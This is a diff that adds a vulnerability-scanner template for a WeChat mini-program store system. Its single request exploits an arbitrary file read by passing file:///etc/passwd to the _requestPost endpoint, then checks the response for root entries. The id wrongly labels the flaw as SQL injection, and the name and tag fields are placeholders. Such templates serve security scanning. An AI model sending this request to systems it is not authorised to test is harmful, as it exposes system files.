@@ -1,0 +1,18 @@
+id: whmd-requestPost-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 万能门店微信小程序不限制小程序生成数量，支持多页面，预约功能等。 本套源码包含多商户插件、点餐插件、拼团插件、积分兑换、小程序手机客服等全套十个插件模块。支持后台一键扫码上传小程序，和后台通用模板。微信万能门店小程序系统存在任意文件读取漏洞
+  reference:
+    - https://github.com/wy876/POC/commit/c9333bf4723944aca9effa2205d7a735d28ce2d5#diff-03401d17bb5cd63882348db74d02bd5543350142a34b53f8360eb3eef0e95ba5R1
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/wxapps/_requestPost?url=file:///etc/passwd&data=1"
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
